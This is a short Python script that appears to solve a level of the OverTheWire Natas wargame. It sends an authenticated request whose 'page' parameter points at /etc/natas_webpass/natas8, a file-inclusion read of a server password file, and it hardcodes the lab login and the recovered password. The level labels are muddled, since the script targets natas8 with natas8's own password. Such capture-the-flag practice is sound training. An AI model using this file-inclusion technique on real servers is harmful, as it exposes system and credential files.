#!/usr/bin/python3


import requests

url = 'http://natas8.natas.labs.overthewire.org'
auth = ('natas8', 'a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB')

# from looking at the source we can access the password from /etc/natas_webpass/natas8

# requests.get has a key word arg that takes in parameters from a dict which can
# be converted into the querries of URLs
params = {'page': '/etc/natas_webpass/natas8'}
r = requests.get(url=f'{url}', auth=auth, params=params)
print(r.text)

# passwd: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB